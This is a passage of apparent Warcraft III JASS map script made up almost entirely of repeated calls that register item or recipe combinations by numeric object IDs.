call BwG($49304E55,$49304E4F,$49304E54,$4930474D,$49303430,0,0)
call BwG($49304E53,$49304E4B,$49304E56,$4930474E,$4930335A,0,0)
call BwG($49304E51,$49304E4E,$49304E58,$4930474C,$49303434,0,0)
call BwG($49304E52,$49304E57,$49304E4C,$49303435,$49303147,$49303139,0)
call BwG($49304E50,$49304E59,$49304E4D,$49303142,$49303432,$49303149,0)
call BwG($49304F53,$49304F54,$49304F46,$49304F4C,$49304F4B,0,0)
call BwG($49304F4D,$49304F4E,$49304F30,$49304F4C,$49304F4B,0,0)
call BwG($49304F4F,$49304F50,$49304F34,$49304F4C,$49304F4B,0,0)
call BwG($49304F34,$49304E53,$49304F35,0,0,0,0)
call BwG($49304F55,$49304F56,$49304F32,$49304F4C,$49304F4B,0,0)
call BwG($49304F51,$49304F52,$49304F49,$49304F4C,$49304F4B,0,0)
call BwG($49305044,$49305045,$49305043,$49303230,$49305042,$4930424A,0)
call BwG($49305046,$49305047,$49303843,$49305042,$49305043,$4930424C,0)
call BwG($49305048,$49305049,$49303159,$49305042,$49305043,$4930424C,0)
call BwG($4930504A,$4930504D,$4930504C,$4930504B,$6863756E,0,0)
call BwG($49305057,$4930474B,$49304D47,0,0,0,0)
call BwG($49305058,$49305055,$49305057,0,0,0,0)
call BwG($4930505A,$49305056,$49305058,0,0,0,0)
call BwG($49305133,$49305132,$726C6966,$686C7374,0,0,0)
call BwG($49305134,$49305135,$49304F51,$49305131,$4930474F,0,0)
call BwG($49305139,$49305138,$49304F55,$49305059,$4930474F,0,0)
call BwG($49305136,$49305137,$49304F4F,$49305059,$4930474F,0,0)
call BwG($49305143,$49305144,$49304F4D,$49305130,$4930474F,0,0)
call BwG($49305142,$49305141,$49304F53,$4930505A,$4930474F,0,0)
call BwG($49305633,$49305632,$49305551,$49304650,$49305359,0,0)
call BwG($49305355,$49305354,$49305243,$49305044,$49305235,$49304A52,0)
call BwG($49305357,$49305356,$49305243,$49304931,$49305235,$49304A52,0)
call BwG($49305359,$49305358,$49305241,$49304933,$49305235,$49304A52,0)
call BwG($49305430,$4930535A,$49305245,$49305046,$49305235,$49304A52,0)
call BwG($49305432,$49305431,$49305245,$49305048,$49305235,$49304A52,0)
call BwG($4930544A,$676D6672,$4930524E,$4930514F,$73687764,0,0)
call BwG($49305457,$49305456,$49305455,$49305454,0,0,0)
call BwG($49305534,$49305535,$49305544,$4930534F,$4930544A,$49304C41,0)
call BwG($49305544,$49305546,$49304C33,$49304C34,$49304C35,$4930534E,$49305234)
call BwG($49305538,$49305539,$49305544,$4930534F,$4930544A,$49305037,0)
call BwG($49305541,$49305542,$49305545,$4930534F,$4930544A,$49304C42,0)
call BwG($49305532,$49305533,$49305543,$4930534F,$4930544A,$49305039,0)
call BwG($49305A46,$49305A45,$49305357,$4930554F,$49304653,0,0)
call BwG($49305A48,$49305A47,$49303731,0,0,0,0)
call BwG($49305A49,$49305A48,$49303732,0,0,0,0)
call BwG($49305A4A,$49305A49,$49303748,0,0,0,0)
call BwG($49305A4B,$49305A4A,$49303934,0,0,0,0)
call BwG($49305A4C,$49305A4B,$4930395A,0,0,0,0)
call BwG($49305A4D,$49305A4C,$74726574,0,0,0,0)
call BwG($49305A4E,$49305A4D,$49304A55,0,0,0,0)
call BwG($49305A4F,$49305A4E,$49304D50,0,0,0,0)
call BwG($49305A50,$49305A4F,$4930324E,0,0,0,0)
call BwG($49304E34,$49304B35,$49304D50,0,0,0,0)
call BwG($4930365A,$4930364F,$49303731,0,0,0,0)
call BwG($49303745,$4930365A,$49303732,0,0,0,0)
call BwG($4930374F,$49303745,$49303748,0,0,0,0)
call BwG($4930394E,$4930374F,$49303934,0,0,0,0)
call BwG($49303956,$4930394E,$4930395A,0,0,0,0)
call BwG($74677268,$49303956,$74726574,0,0,0,0)
call BwG($49304B36,$74677268,$49304A55,0,0,0,0)
call BwG($49304E35,$49304B36,$49304D50,0,0,0,0)
call BwG($49303730,$4930364D,$49303731,0,0,0,0)
call BwG($49303746,$49303730,$49303732,0,0,0,0)
call BwG($49303750,$49303746,$49303748,0,0,0,0)
call BwG($4930394F,$49303750,$49303934,0,0,0,0)
call BwG($49303957,$4930394F,$4930395A,0,0,0,0)
call BwG($646B6677,$49303957,$74726574,0,0,0,0)
call BwG($49304B41,$646B6677,$49304A55,0,0,0,0)
call BwG($49304E36,$49304B41,$49304D50,0,0,0,0)
call BwG($49304549,$49304548,$49303731,0,0,0,0)
call BwG($4930454A,$49304549,$49303732,0,0,0,0)
call BwG($4930454B,$4930454A,$49303748,0,0,0,0)
call BwG($4930454C,$4930454B,$49303934,0,0,0,0)
call BwG($4930454D,$4930454C,$4930395A,0,0,0,0)
call BwG($4930454E,$4930454D,$74726574,0,0,0,0)
call BwG($49304B44,$4930454E,$49304A55,0,0,0,0)
call BwG($49304D58,$49304B44,$49304D50,0,0,0,0)
call BwG($4930484A,$49304849,$49303731,0,0,0,0)
call BwG($4930484B,$4930484A,$49303732,0,0,0,0)
call BwG($4930484C,$4930484B,$49303748,0,0,0,0)
call BwG($4930484D,$4930484C,$49303934,0,0,0,0)
call BwG($4930484E,$4930484D,$4930395A,0,0,0,0)
call BwG($4930484F,$4930484E,$74726574,0,0,0,0)
call BwG($49304B43,$4930484F,$49304A55,0,0,0,0)
call BwG($49304D56,$49304B43,$49304D50,0,0,0,0)
call BwG($49304A38,$49304A37,$49303731,0,0,0,0)
call BwG($49304A39,$49304A38,$49303732,0,0,0,0)
call BwG($49304A41,$49304A39,$49303748,0,0,0,0)
call BwG($49304A42,$49304A41,$49303934,0,0,0,0)
call BwG($49304A43,$49304A42,$4930395A,0,0,0,0)
call BwG($49304A44,$49304A43,$74726574,0,0,0,0)
call BwG($49304B45,$49304A44,$49304A55,0,0,0,0)
call BwG($49304E39,$49304B45,$49304D50,0,0,0,0)
call BwG($49304C47,$49304C46,$49303731,0,0,0,0)
call BwG($49304C48,$49304C47,$49303732,0,0,0,0)
call BwG($49304C49,$49304C48,$49303748,0,0,0,0)
call BwG($49304C4A,$49304C49,$49303934,0,0,0,0)
call BwG($49304C4B,$49304C4A,$4930395A,0,0,0,0)
call BwG($49304C4C,$49304C4B,$74726574,0,0,0,0)
call BwG($49304C4D,$49304C4C,$49304A55,0,0,0,0)
call BwG($49304E37,$49304C4D,$49304D50,0,0,0,0)
call BwG($49304D49,$49304D48,$49303731,0,0,0,0)
call BwG($49304D4A,$49304D49,$49303732,0,0,0,0)
call BwG($49304D4B,$49304D4A,$49303748,0,0,0,0)
call BwG($49304D4C,$49304D4B,$49303934,0,0,0,0)
call BwG($49304D4D,$49304D4C,$4930395A,0,0,0,0)
call BwG($49304D4E,$49304D4D,$74726574,0,0,0,0)
call BwG($49304D4F,$49304D4E,$49304A55,0,0,0,0)
call BwG($49304E42,$49304D4F,$49304D50,0,0,0,0)
call BwG($49304F36,$49304F42,$49303731,0,0,0,0)
call BwG($49304F37,$49304F36,$49303732,0,0,0,0)
call BwG($49304F38,$49304F37,$49303748,0,0,0,0)
call BwG($49304F39,$49304F38,$49303934,0,0,0,0)
call BwG($49304F41,$49304F39,$4930395A,0,0,0,0)
call BwG($49304F43,$49304F41,$74726574,0,0,0,0)
call BwG($49304F44,$49304F43,$49304A55,0,0,0,0)
call BwG($49304F45,$49304F44,$49304D50,0,0,0,0)
call BwG($49305146,$49305145,$49303731,0,0,0,0)
call BwG($49305147,$49305146,$49303732,0,0,0,0)
call BwG($49305148,$49305147,$49303748,0,0,0,0)
call BwG($49305149,$49305148,$49303934,0,0,0,0)
call BwG($4930514A,$49305149,$4930395A,0,0,0,0)
call BwG($4930514B,$4930514A,$74726574,0,0,0,0)
call BwG($4930514C,$4930514B,$49304A55,0,0,0,0)
call BwG($4930514D,$4930514C,$49304D50,0,0,0,0)
call BwG($49305442,$49305441,$49303731,0,0,0,0)
call BwG($49305443,$49305442,$49303732,0,0,0,0)
call BwG($49305444,$49305443,$49303748,0,0,0,0)
call BwG($49305445,$49305444,$49303934,0,0,0,0)
call BwG($49305446,$49305445,$4930395A,0,0,0,0)
call BwG($49305447,$49305446,$74726574,0,0,0,0)
call BwG($49305448,$49305447,$49304A55,0,0,0,0)
call BwG($49305449,$49305448,$49304D50,0,0,0,0)
call BwG($49303550,$4930354F,$49303145,$49303143,$49303141,$49303146,0)
call BwG($49303554,$49303553,$49303436,$49303431,$49303433,0,0)
call BwG($49303556,$49303555,$49303332,$49303331,$49303330,0,0)
call BwG($49303557,$49303558,$4930414E,$49303550,$49303554,$49303556,0)
call BwG($4930355A,$49303559,$49303151,$49303153,$4930314C,$49303152,0)
call BwG($49303633,$49303632,$49303341,$49303344,0,0,0)
call BwG($49303634,$49303635,$4930414D,$49303633,$4930355A,$49303631,$49303557)
call BwG($49303643,$49303642,$4930334A,$49303349,$49303348,0,0)
call BwG($49303641,$49303639,$49303444,$49303445,$49303446,0,0)
call BwG($49303638,$49303637,$49303232,$49303233,$49303234,$49303235,0)
call BwG($49303645,$49303644,$49303636,$49303641,$49303638,$49303643,$49303634)
call BwG($49303647,$49303646,$49303358,$49303146,0,0,0)
call BwG($49303654,$49303650,$49303651,$49303652,$49303653,0,0)
call BwG($49303934,$49303931,$49303932,$49303933,0,0,0)
call BwG($4930395A,$49303959,$49303958,0,0,0,0)
call BwG($72646532,$72617439,$6863756E,$6473756D,0,0,0)
call BwG($72646531,$636E6F62,$6863756E,$6473756D,0,0,0)
call BwG($62656C76,$72687468,$6863756E,$6473756D,0,0,0)
call BwG($726C6966,$72646533,$62656C76,$72646531,$72646532,0,0)
call BwG($706E7675,$776C7364,$77637963,$77696C6C,0,0,0)
call BwG($72656A33,$776F6D73,$77637963,$77696C6C,0,0,0)
call BwG($66677267,$77736873,$77637963,$77696C6C,0,0,0)
call BwG($686C7374,$706F6D6E,$66677267,$72656A33,$706E7675,0,0)
call BwG($67666F72,$676F6D6E,$49303355,$49303248,$49303249,0,0)
call BwG($74706F77,$676F6D6E,$4930334F,$4930324F,$49303454,0,0)
call BwG($49304242,$74706F77,$49304239,0,0,0,0)
call BwG($74647832,$676F6D6E,$49303350,$4930324C,$49303247,0,0)
call BwG($49304243,$74647832,$49304239,0,0,0,0)
call BwG($49303754,$49303755,$49303147,$4930314C,$49303232,0,0)
call BwG($49303758,$49303759,$49303149,$4930315A,$4930314E,0,0)
call BwG($49303756,$49303757,$49303148,$49303233,$4930314F,0,0)
call BwG($49304147,$49304146,$49304143,$49303756,$49303238,$49303245,0)
call BwG($49304142,$49304141,$49304143,$49303754,$49303244,$49303237,0)
call BwG($49304145,$49304144,$49304143,$49303758,$49303239,$49303246,0)
call BwG($70656E72,$77617264,$49304143,$49304147,$4930324F,$4930324D,0)
call BwG($73707368,$706D6E61,$49304143,$49304142,$49303249,$49303250,0)
call BwG($72617463,$72617436,$49304143,$49304145,$4930324A,$4930324C,0)
call BwG($49303159,$49303847,$49304758,$49305142,0,0,0)
call BwG($49303157,$49303847,$49304758,$49305136,0,0,0)
call BwG($49303230,$49303847,$49304758,$49305134,0,0,0)
call BwG($49303843,$49303847,$49304758,$49305143,0,0,0)
call BwG($49304A54,$49304A52,$49304A53,0,0,0,0)
call BwG($49303458,$49303236,$49304833,0,0,0,0)
call BwG($63686573,$49304A55,$6B79736E,0,0,0,0)
call BwG($6B79736E,$74726574,$617A6872,0,0,0,0)
call BwG($617A6872,$4930395A,$73636C70,0,0,0,0)
call BwG($73636C70,$49303934,$636E686E,0,0,0,0)
call BwG($636E686E,$49303748,$627A6265,0,0,0,0)
call BwG($627A6265,$49303732,$627A6266,0,0,0,0)
call BwG($627A6266,$49303731,$6A706E74,0,0,0,0)
call BwG($4930534F,$4930534E,$4930514F,0,0,0,0)
call BwG($49304F46,$49304F47,$49304E55,0,0,0,0)
call BwG($49304F49,$49304F48,$49304E52,0,0,0,0)
call BwG($49304F32,$49304F33,$49304E51,0,0,0,0)
call BwG($49304F30,$49304F31,$49304E50,0,0,0,0)
call BwG($49304855,$49304854,$49304930,0,0,0,0)
call BwG($49304854,$49304853,$4930485A,0,0,0,0)
call BwG($49304852,$49304857,$49304930,0,0,0,0)
call BwG($49304857,$4930485A,$49304856,0,0,0,0)
call BwG($49304851,$49304930,$49304859,0,0,0,0)
call BwG($49304859,$4930485A,$49304858,0,0,0,0)
call BwG($4930554F,$49304E45,$49305550,0,0,0,0)
call BwG($49305553,$49304E45,$49305554,0,0,0,0)
call BwG($49305551,$49304E45,$49305552,0,0,0,0)
call BwG($49305334,$49305335,$49305055,0,0,0,0)
call BwG($49305336,$49305334,$49303138,$49303737,0,0,0)
call BwG($49305337,$49305336,$4930534B,$49305349,$49305345,0,0)
call BwG($49305338,$49305337,$49304F4C,$49304F4B,0,0,0)
call BwG($49305339,$49305338,$49305043,$49305042,0,0,0)
call BwG($49305341,$49305339,$49304C36,0,0,0,0)
call BwG($49305342,$49305341,$49304A52,0,0,0,0)
call BwG($49305343,$49305342,$49304831,$4930485A,0,0,0)
call BwG($49305344,$49305343,$49304939,$72617433,0,0,0)
call BwG($6C656467,$6C6D6272,$746F7477,$73727263,$706E766C,0,0)
call BwG($49304A4A,$6B336D32,$61727368,$73747761,$72617433,0,0)
call BwG($49304A4D,$676C736B,$61727368,$73747761,$72617433,0,0)
call BwG($49304A4B,$74686C65,$61727368,$73747761,$72617433,0,0)
call BwG($49304A4C,$616D7263,$61727368,$73747761,$72617433,0,0)
call BwG($4930584A,$64706865,$61727368,$73747761,$72617433,0,0)
call BwG($4930584C,$70616D73,$61727368,$73747761,$72617433,0,0)
call BwG($49304D44,$6B67616C,$7468646D,$7372746C,$626C6261,$616E6667,0)
call BwG($49304D43,$62726167,$7468646D,$7372746C,$626C6261,$616E6667,0)
call BwG($49304D42,$69776272,$7468646D,$7372746C,$626C6261,$616E6667,0)
call BwG($49304D41,$656E766C,$7468646D,$7372746C,$626C6261,$616E6667,0)
call BwG($4930584B,$676F626D,$7468646D,$7372746C,$626C6261,$616E6667,0)
call BwG($4930584D,$74656C73,$7468646D,$7372746C,$626C6261,$616E6667,0)
call BwG($4930584F,$726F7473,$736F756C,$6573617A,$7363686C,0,0)
call BwG($49305850,$73747067,$736F756C,$6573617A,$7363686C,0,0)
call BwG($49305851,$7368656E,$736F756C,$6573617A,$7363686C,0,0)
call BwG($49305852,$70737064,$736F756C,$6573617A,$7363686C,0,0)
call BwG($49305853,$736B7368,$736F756C,$6573617A,$7363686C,0,0)
call BwG($49305854,$666C6167,$736F756C,$6573617A,$7363686C,0,0)
call BwG($49313038,$64747362,$67656D74,$7462616B,0,0,0)
call BwG($49305954,$49305941,$49303731,0,0,0,0)
call BwG($49305A31,$49305954,$49303732,0,0,0,0)
call BwG($49305955,$49305A31,$49303748,0,0,0,0)
call BwG($49305939,$49305955,$49303934,0,0,0,0)
call BwG($49305A32,$49305939,$4930395A,0,0,0,0)
call BwG($49305A33,$49305A32,$74726574,0,0,0,0)
call BwG($49305938,$49305A33,$49304A55,0,0,0,0)
call BwG($49305A35,$49305938,$49304D50,0,0,0,0)
call BwG($49305A44,$49305A35,$4930324E,0,0,0,0)
call BwG($49305335,$49303654,$49303059,0,0,0,0)
call BwG($49304A55,$4930595A,$49304A54,0,0,0,0)
call BwG($73626F6B,$6772736C,$4930544A,$72617433,$61727368,0,0)
call BwG($49305847,$49304C59,$49305457,$49303533,$49303530,0,0)
call BwG($49305956,$49305957,$49305457,$49303532,$49303535,0,0)
call BwG($49305958,$49304C58,$49305457,$49303534,$49303531,0,0)
call BwG($49305A30,$49305A34,$49305847,$49303539,$49303545,0,0)
call BwG($49303048,$49304958,$49305847,$49303537,$49303543,0,0)
call BwG($49305331,$49304C5A,$49305958,$49303536,$49303542,0,0)
call BwG($49304834,$49305A36,$49305958,$49303536,$49303542,0,0)
call BwG($49304D38,$49305259,$49305956,$49303544,$49303541,0,0)
call BwG($4930525A,$49305330,$49305956,$49303538,$49303546,0,0)
call BwG($49304D36,$49305959,$49303048,$49304239,$49305043,$73747761,$49304248)
call BwG($49304D35,$49305054,$49303048,$49304239,$49305043,$73747761,$49304246)
call BwG($49305638,$49304D37,$49305A30,$49304239,$49305043,$73747761,$49304248)
call BwG($49305332,$49304554,$49305A30,$49304239,$49305043,$73747761,$49304246)
call BwG($49305639,$49305933,$49305331,$49304239,$49305043,$73747761,$49304244)
call BwG($49305333,$49305348,$49305331,$49304239,$49305043,$73747761,$49304245)
call BwG($49304D34,$49305A42,$49304834,$49304239,$49305043,$73747761,$49304244)
call BwG($49304E5A,$49305A37,$49304834,$49304239,$49305043,$73747761,$49304245)
call BwG($49305A39,$49305A43,$4930525A,$49304239,$49305043,$73747761,$49304247)
call BwG($49305A38,$49305A41,$4930525A,$49304239,$49305043,$73747761,$49304249)
call BwG($49305050,$4930554A,$49304D38,$49304239,$49305043,$73747761,$49304247)
call BwG($49305053,$49313051,$49304D38,$49304239,$49305043,$73747761,$49304249)
call BwG($6C6E726E,$72646530,$49303731,0,0,0,0)
call BwG($726E7370,$6C6E726E,$49303732,0,0,0,0)
call BwG($6A64726E,$726E7370,$49303748,0,0,0,0)
call BwG($63726474,$6A64726E,$49303934,0,0,0,0)
call BwG($6B6C6D6D,$63726474,$4930395A,0,0,0,0)
call BwG($7664646C,$6B6C6D6D,$74726574,0,0,0,0)
call BwG($66726764,$7664646C,$49304A55,0,0,0,0)
call BwG($64727068,$66726764,$49304D50,0,0,0,0)
call BwG($6D6C7374,$64727068,$4930324E,0,0,0,0)
call BwG($49313055,$49313056,$49304D36,$4930314B,$72656A31,$61727368,$49304939)
call BwG($49313057,$49313058,$49304D35,$4930314B,$72656A31,$61727368,$49304939)
call BwG($49313059,$4931305A,$49305638,$49303833,$72656A31,$61727368,$49304939)
call BwG($49313130,$49313131,$49305332,$49303833,$72656A31,$61727368,$49304939)
call BwG($49313132,$49313133,$49305639,$4930314B,$73726264,$61727368,$49304939)
call BwG($49313134,$49313135,$49305333,$4930314B,$73726264,$61727368,$49304939)
call BwG($49313136,$49313137,$49304D34,$49303833,$73726264,$61727368,$49304939)
call BwG($49313138,$49313139,$49304E5A,$49303833,$73726264,$61727368,$49304939)
call BwG($49313141,$49313142,$49305A39,$4930314B,$6E737069,$61727368,$49304939)
call BwG($49313143,$49313144,$49305A38,$4930314B,$6E737069,$61727368,$49304939)
call BwG($49313145,$49313146,$49305050,$49303833,$6E737069,$61727368,$49304939)
call BwG($49313147,$49313148,$49305053,$49303833,$6E737069,$61727368,$49304939)
call BwG($49313150,$49313154,$726C6966,$4930415A,$4930424D,$49303550,$49303554)
call BwG($4931314C,$49313152,$686C7374,$49313150,$49304252,$6F646566,$49303631)
call BwG($49313151,$49313157,$6C656467,$4931314C,$49304254,$49304232,$49303638)
call BwG($4931314D,$49313151,$49313156,$74706F77,$49304245,$49304258,$49303353)
call BwG($4931314E,$4931314D,$49313153,$49304242,$4930424B,$4930425A,$49303542)
call BwG($4931314F,$4931314E,$49313155,$49304546,$49305344,$49304333,$49305351)
endfunction
function BwK takes nothing returns nothing
local trigger QE
call BwG($64747362,$746D7363,$6C656467,$49305133,0,0,0)
call BwG($67656D74,$6173626C,$6C656467,$49305133,0,0,0)
call BwG($7462616B,$67736F75,$6C656467,$49305133,0,0,0)
call BwG($4930384A,$49303847,$49304758,$49305139,0,0,0)
call BwG($49305A52,$49305A51,$7363686C,$6573617A,$736F756C,0,0)
call BwG($49305536,$49305537,$49305543,$4930534F,$4930544A,$49304C37,0)
call BwG($49313050,$4931304F,$49305543,$4930534F,$4930544A,$4931304D,0)
call BwG($49305545,$49305547,$49304C33,$49304C34,$49304C35,$4930534E,$49305234)
call BwG($49305543,$49305548,$49304C33,$49304C34,$49304C35,$4930534E,$49305234)
call BwG($49305044,$49305045,$49305043,$49305042,$49303230,$4930424A,0)
call BwG($49305046,$49305047,$49305043,$49305042,$49303843,$4930424C,0)
call BwG($49304933,$49304934,$49305043,$49305042,$49303157,$4930424B,0)
call BwG($49305048,$49305049,$49305043,$49305042,$49303159,$4930424C,0)
call BwG($49304931,$49304932,$49305043,$49305042,$4930384A,$4930424A,0)
call BwG($49303448,$4930324B,$49303453,$4930345A,$49303452,$49303154,0)
call BwG($49303831,$49303830,$49303833,$4930314B,$49303853,$49303852,0)
call BwG($49305655,$4930375A,$4930314D,$49303448,$49303831,$49304B53,0)
call BwG($49305653,$4930375A,$4930314D,$49303448,$49303831,$49304B54,0)
call BwG($49305654,$4930375A,$4930314D,$49303448,$49303831,$49304B55,0)
call BwG($49305656,$4930375A,$4930314D,$49303448,$49303831,$49304B52,0)
call BwG($49304F59,$49305436,$49304957,$49305043,$49305042,0,0)
call BwG($49304953,$49304955,$49304A32,$49304831,$49304939,0,0)
call BwG($49305435,$49304956,$49305433,$49305234,$49303833,0,0)
call BwG($49305734,$4930324E,$4930514D,0,0,0,0)
call BwG($49305735,$4930324E,$49304D51,0,0,0,0)
call BwG($49305736,$4930324E,$49304D52,0,0,0,0)
call BwG($49305737,$4930324E,$49304E36,0,0,0,0)
call BwG($49305738,$4930324E,$49304D53,0,0,0,0)
call BwG($49305739,$4930324E,$49304F45,0,0,0,0)
call BwG($49305741,$4930324E,$49304D54,0,0,0,0)
call BwG($49305742,$4930324E,$49304D55,0,0,0,0)
call BwG($49305743,$4930324E,$49304D56,0,0,0,0)
call BwG($49305744,$4930324E,$49304D57,0,0,0,0)
call BwG($49305745,$4930324E,$49304D58,0,0,0,0)
call BwG($49305746,$4930324E,$49304D59,0,0,0,0)
call BwG($49305747,$4930324E,$49304D5A,0,0,0,0)
call BwG($49305748,$4930324E,$49304E30,0,0,0,0)
call BwG($49305749,$4930324E,$49304E31,0,0,0,0)
call BwG($4930574A,$4930324E,$49304E32,0,0,0,0)
call BwG($4930574B,$4930324E,$49304E33,0,0,0,0)
call BwG($4930574C,$4930324E,$49304E34,0,0,0,0)
call BwG($4930574D,$4930324E,$49304E35,0,0,0,0)
call BwG($4930574E,$4930324E,$49304E37,0,0,0,0)
call BwG($4930574F,$4930324E,$49304E38,0,0,0,0)
call BwG($49305750,$4930324E,$49305449,0,0,0,0)
call BwG($49305751,$4930324E,$49304E39,0,0,0,0)
call BwG($49305752,$4930324E,$49304E41,0,0,0,0)
call BwG($49305753,$4930324E,$49304E42,0,0,0,0)
call BwG($4930414E,$49304A36,$49305434,$4930474B,$6863756E,$6473756D,0)
call BwG($4930414D,$49304A34,$49304A35,$706F6D6E,$49303437,$49303438,$49303439)
call BwG($49303636,$49304143,$49303447,$49304954,$49305438,$49303737,$49305437)
call BwG($4930414F,$4930304B,$49304A33,$49304F4C,$49304F4B,$49304150,0)
call BwG($49304338,$49303455,$49303458,$49305043,$49303535,$49303534,$49303533)
call BwG($49304352,$49303449,$49303241,$49303451,$49304831,0,0)
call BwG($49304B56,$49303243,$49304939,$49304930,$4930485A,$49303242,0)
call BwG($49305833,$49303049,$49305832,$49305831,0,0,0)
call BwG($49305834,$49304737,$49305832,$49305831,0,0,0)
call BwG($49305835,$49305247,$49305832,$49305831,0,0,0)
call BwG($49305836,$49305835,$49305758,$49305831,0,0,0)
call BwG($49305837,$49305833,$49305758,$49305831,0,0,0)
call BwG($49305838,$49305834,$49305758,$49305831,0,0,0)
call BwG($49305841,$49305248,$49305758,$49305831,0,0,0)
call BwG($49305839,$49305841,$49305758,$4930575A,0,0,0)
call BwG($49305842,$49304738,$49305830,$4930575A,0,0,0)
call BwG($49305843,$49305842,$49305830,$49305759,0,0,0)
call BwG($49305845,$49305844,$49305831,$49305759,$4930575A,$49305758,$49305830)
call BwG($49305844,$49305836,$49305837,$49305839,$49305838,$49305843,0)
call BwG($4930594D,$4930594E,$49303833,$49303448,$4930314D,0,0)
call BwG($4930594A,$4930594B,$4930594C,$49305243,$4930554F,0,0)
call BwG($49305947,$49305949,$4930594C,$49305241,$49305551,0,0)
call BwG($49305946,$49305948,$4930594C,$49305245,$49305553,0,0)
call BwG($49305942,$49305944,$4930594A,$4930594D,$49305A46,0,0)
call BwG($4930594F,$49305950,$49305947,$4930594D,$49305631,0,0)
call BwG($49305A56,$49305A57,$49305947,$4930594D,$49305633,0,0)
call BwG($49313030,$49305A5A,$49305946,$4930594D,$49305635,0,0)
call BwG($49305A59,$49305A58,$49305946,$4930594D,$49305637,0,0)
call BwG($49305951,$49305952,$4930594A,$4930594D,$4930555A,0,0)
call BwG($49313031,$49305937,$4930594A,$4930594D,$49305558,0,0)
call BwG($49305953,$49305945,$4930594A,$4930594D,$49305555,0,0)
call BwG($72726573,$72686531,$49303731,0,0,0,0)
call BwG($72737073,$72726573,$49303732,0,0,0,0)
call BwG($72686532,$72737073,$49303748,0,0,0,0)
call BwG($726D616E,$72686532,$49303934,0,0,0,0)
call BwG($72726562,$726D616E,$4930395A,0,0,0,0)
call BwG($6D6F7274,$72726562,$74726574,0,0,0,0)
call BwG($49304B42,$6D6F7274,$49304A55,0,0,0,0)
call BwG($49304E41,$49304B42,$49304D50,0,0,0,0)
call BwG($72737064,$72646973,$49303731,0,0,0,0)
call BwG($72776174,$72737064,$49303732,0,0,0,0)
call BwG($7273706C,$72776174,$49303748,0,0,0,0)
call BwG($72726532,$7273706C,$49303934,0,0,0,0)
call BwG($72686533,$72726532,$4930395A,0,0,0,0)
call BwG($776F6C67,$72686533,$74726574,0,0,0,0)
call BwG($49304B38,$776F6C67,$49304A55,0,0,0,0)
call BwG($49304D52,$49304B38,$49304D50,0,0,0,0)
call BwG($636C7364,$6763656C,$49303731,0,0,0,0)
call BwG($7373696C,$636C7364,$49303732,0,0,0,0)
call BwG($7374656C,$7373696C,$49303748,0,0,0,0)
call BwG($62677374,$7374656C,$49303934,0,0,0,0)
call BwG($6C687374,$62677374,$4930395A,0,0,0,0)
call BwG($70686561,$6C687374,$74726574,0,0,0,0)
call BwG($49304A58,$70686561,$49304A55,0,0,0,0)
call BwG($49304D55,$49304A58,$49304D50,0,0,0,0)
call BwG($72696E31,$73626368,$49303731,0,0,0,0)
call BwG($7277697A,$72696E31,$49303732,0,0,0,0)
call BwG($6D636F75,$7277697A,$49303748,0,0,0,0)
call BwG($636C666D,$6D636F75,$49303934,0,0,0,0)
call BwG($63697269,$636C666D,$4930395A,0,0,0,0)
call BwG($68736C76,$63697269,$74726574,0,0,0,0)
call BwG($49304A5A,$68736C76,$49304A55,0,0,0,0)
call BwG($49304D59,$49304A5A,$49304D50,0,0,0,0)
call BwG($776E6567,$746B6E6F,$49303731,0,0,0,0)
call BwG($726E6563,$776E6567,$49303732,0,0,0,0)
call BwG($6D637269,$726E6563,$49303748,0,0,0,0)
call BwG($736B756C,$6D637269,$49303934,0,0,0,0)
call BwG($76616D70,$736B756C,$4930395A,0,0,0,0)
call BwG($706C636C,$76616D70,$74726574,0,0,0,0)
call BwG($49304B37,$706C636C,$49304A55,0,0,0,0)
call BwG($49304E38,$49304B37,$49304D50,0,0,0,0)
call BwG($70696E76,$706D616E,$49303731,0,0,0,0)
call BwG($70636C72,$70696E76,$49303732,0,0,0,0)
call BwG($74736374,$70636C72,$49303748,0,0,0,0)
call BwG($74636173,$74736374,$49303934,0,0,0,0)
call BwG($6D6F6F6E,$74636173,$4930395A,0,0,0,0)
call BwG($73696C6B,$6D6F6F6E,$74726574,0,0,0,0)
call BwG($49304A57,$73696C6B,$49304A55,0,0,0,0)
call BwG($49304D53,$49304A57,$49304D50,0,0,0,0)
call BwG($74657870,$74696E32,$49303731,0,0,0,0)
call BwG($74737472,$74657870,$49303732,0,0,0,0)
call BwG($74737432,$74737472,$49303748,0,0,0,0)
call BwG($6D616E68,$74737432,$49303934,0,0,0,0)
call BwG($72726531,$6D616E68,$4930395A,0,0,0,0)
call BwG($6D67746B,$72726531,$74726574,0,0,0,0)
call BwG($49304B39,$6D67746B,$49304A55,0,0,0,0)
call BwG($49304D54,$49304B39,$49304D50,0,0,0,0)
call BwG($49303033,$49303032,$49303731,0,0,0,0)
call BwG($49303034,$49303033,$49303732,0,0,0,0)
call BwG($49303036,$49303034,$49303748,0,0,0,0)
call BwG($49303442,$49303036,$49303934,0,0,0,0)
call BwG($49303443,$49303442,$4930395A,0,0,0,0)
call BwG($736E6567,$49303443,$74726574,0,0,0,0)
call BwG($49304A56,$736E6567,$49304A55,0,0,0,0)
call BwG($49304D51,$49304A56,$49304D50,0,0,0,0)
call BwG($49303655,$4930354C,$49303731,0,0,0,0)
call BwG($49303738,$49303655,$49303732,0,0,0,0)
call BwG($49303749,$49303738,$49303748,0,0,0,0)
call BwG($49303948,$49303749,$49303934,0,0,0,0)
call BwG($49303950,$49303948,$4930395A,0,0,0,0)
call BwG($7373616E,$49303950,$74726574,0,0,0,0)
call BwG($49304A59,$7373616E,$49304A55,0,0,0,0)
call BwG($49304D57,$49304A59,$49304D50,0,0,0,0)
call BwG($49303656,$4930364A,$49303731,0,0,0,0)
call BwG($49303739,$49303656,$49303732,0,0,0,0)
call BwG($4930374A,$49303739,$49303748,0,0,0,0)
call BwG($49303949,$4930374A,$49303934,0,0,0,0)
call BwG($49303951,$49303949,$4930395A,0,0,0,0)
call BwG($73747770,$49303951,$74726574,0,0,0,0)
call BwG($49304B30,$73747770,$49304A55,0,0,0,0)
call BwG($49304D5A,$49304B30,$49304D50,0,0,0,0)
call BwG($4930364E,$49303733,$49303731,0,0,0,0)
call BwG($49303741,$4930364E,$49303732,0,0,0,0)
call BwG($4930374B,$49303741,$49303748,0,0,0,0)
call BwG($4930394A,$4930374B,$49303934,0,0,0,0)
call BwG($49303952,$4930394A,$4930395A,0,0,0,0)
call BwG($7370726F,$49303952,$74726574,0,0,0,0)
call BwG($49304B31,$7370726F,$49304A55,0,0,0,0)
call BwG($49304E30,$49304B31,$49304D50,0,0,0,0)
call BwG($49304134,$49304133,$49303731,0,0,0,0)
